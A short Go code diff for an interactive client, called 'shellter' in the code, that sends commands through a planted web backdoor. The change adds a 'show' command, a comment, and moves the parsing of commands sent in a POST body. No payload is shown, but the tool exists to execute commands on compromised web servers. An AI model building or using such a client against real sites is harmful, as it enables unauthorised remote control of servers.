@@ -47,7 +47,6 @@ func executor(in string) {
 			return
 		}
 
-		interactCommand := strings.Split(in, "command")
 		command := blocks[1]
 		if InParams == "yes" {
 			url := Url + command
@@ -55,6 +54,8 @@ func executor(in string) {
 			return
 		}
 
+		/*If payload send in body format parses the command*/
+		interactCommand := strings.Split(in, "command")
 		malpaylaoad := payload.GenPayload(Type, interactCommand[1])
 		request.DoPostRequestPayloadInBody(Url, malpaylaoad)
 		return
@@ -77,6 +78,7 @@ func executor(in string) {
 		request.DoCheckFileBackdoor(Url)
 		return
 
+	/* The type of payload */
 	case "type":
 		if len(blocks) < 2 {
 			fmt.Println("please set query, Example : type php")
@@ -84,6 +86,12 @@ func executor(in string) {
 		}
 		Type = blocks[1]
 		fmt.Println("[+] Set type : ", Type)
+		return
+
+	case "show":
+		fmt.Println("[+] URL : ", Url)
+		fmt.Println("[+] Type : ", Type)
+		fmt.Println("[+] Params : ", InParams)
 		return
 
 	case "exit":
@@ -98,7 +106,7 @@ func executor(in string) {
 		return
 	}
 
-	LivePrefixState.LivePrefix = blocks[0] + " -->> "
+	LivePrefixState.LivePrefix = blocks[0] + "-->> "
 	LivePrefixState.IsEnable = true
 }
 
@@ -110,6 +118,7 @@ func completer(in prompt.Document) []prompt.Suggest {
 		{Text: "connect", Description: "check backdoor file "},
 		{Text: "type", Description: "type payload deliver example : type php"},
 		{Text: "exit", Description: "exit shellter"},
+		{Text: "show", Description: "Show variables status"},
 	}
 	return prompt.FilterHasPrefix(s, in.GetWordBeforeCursor(), true)
 }
